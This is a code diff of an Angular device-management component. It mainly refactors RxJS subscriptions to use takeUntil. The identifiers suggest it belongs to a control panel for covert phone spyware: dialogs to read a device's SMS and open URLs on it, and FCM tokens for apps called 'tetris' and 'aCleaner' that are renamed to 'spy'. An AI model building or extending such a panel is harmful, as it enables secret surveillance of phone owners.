@@ -7,8 +7,8 @@ import {
 } from "@angular/core";
 import { MatPaginator, MatTableDataSource, MatDialog } from "@angular/material";
 import { DevicesService } from "./devices.service";
-import { catchError, takeWhile } from "rxjs/operators";
-import { throwError, forkJoin } from "rxjs";
+import { catchError, takeWhile, takeUntil } from "rxjs/operators";
+import { throwError, forkJoin, Subject } from "rxjs";
 import { Device } from "../shared/interfaces";
 import { OpenUrlDialogComponent } from "./open-url-dialog/open-url-dialog.component";
 import { ReadSmsDialogComponent } from "./read-sms-dialog/read-sms-dialog.component";
@@ -23,7 +23,7 @@ export class DevicesComponent implements OnInit, OnDestroy {
   @ViewChild("pageContainer") pageContainer: ElementRef;
   @ViewChild(MatPaginator) paginator: MatPaginator;
 
-  alive = true;
+  _unsubscribeAll: Subject<void> = new Subject();
   showSpinner = true;
   loading = {};
 
@@ -50,7 +50,7 @@ export class DevicesComponent implements OnInit, OnDestroy {
   getDevices(deviceId?) {
     this.deviceService
       .getAllDevices()
-      .pipe(takeWhile(() => this.alive))
+      .pipe(takeUntil(this._unsubscribeAll))
       .subscribe((devices: Device[]) => {
         const devicesList = [];
         devices.map((device: Device, index) => {
@@ -110,7 +110,7 @@ export class DevicesComponent implements OnInit, OnDestroy {
   onRemoveDevice(device) {
     const isRemove = confirm("Are you sure to delete?");
     if (isRemove) {
-      this.deviceService.removeDevice(device._id).pipe(takeWhile(() => this.alive))
+      this.deviceService.removeDevice(device._id).pipe(takeUntil(this._unsubscribeAll))
         .subscribe((v: any) => {
           this.getDevices();
           this.snotify.error(v.message, {
@@ -130,55 +130,12 @@ export class DevicesComponent implements OnInit, OnDestroy {
     };
     this.loading[device.deviceId] = true;
 
-    if (device.tetrisFcmToken !== '' && device.aCleanerFcmToken !== '') {
-      data.tetris = true;
-      data.tetrisFcmToken = device.tetrisFcmToken;
-      data.aCleaner = true;
-      data.aCleanerFcmToken = device.aCleanerFcmToken;
-
-      forkJoin(this.deviceService.checkTetrisConnections(data), this.deviceService.checkCleanerConnections(data)).subscribe(res => {
-        this.getDevices();
-        setTimeout(() => {
-          this.getDevices(device.deviceId);
-        }, 5000);
-        setTimeout(() => {
-          this.getDevices(device.deviceId);
-          this.loading[device.deviceId] = false;
-        }, 10000);
-        console.log(res);
-      });
-      return;
-    }
-
-    if (device.tetrisFcmToken !== '') {
-      data.tetris = true;
-      data.tetrisFcmToken = device.tetrisFcmToken;
+    if (device.spyFcmToken !== '') {
+      data.spy = true;
+      data.spyFcmToken = device.spyFcmToken;
       this.deviceService
-      .checkTetrisConnections(data)
-      .pipe(takeWhile(() => this.alive))
-      .subscribe(
-        res => {
-          if (res) {
-            this.getDevices();
-            setTimeout(() => {
-              this.getDevices(device.deviceId);
-            }, 5000);
-            setTimeout(() => {
-              this.getDevices(device.deviceId);
-              this.loading[device.deviceId] = false;
-            }, 10000);
-            console.log(res);
-          }
-        },
-      );
-    }
-
-    if (device.aCleanerFcmToken !== '') {
-      data.aCleaner = true;
-      data.aCleanerFcmToken = device.aCleanerFcmToken;
-      this.deviceService
-      .checkCleanerConnections(data)
-      .pipe(takeWhile(() => this.alive))
+      .checkSpyConnections(data)
+      .pipe(takeUntil(this._unsubscribeAll))
       .subscribe(
         res => {
           if (res) {
@@ -198,6 +155,7 @@ export class DevicesComponent implements OnInit, OnDestroy {
   }
 
   ngOnDestroy(): void {
-    this.alive = false;
+    this._unsubscribeAll.next();
+    this._unsubscribeAll.complete();
   }
 }
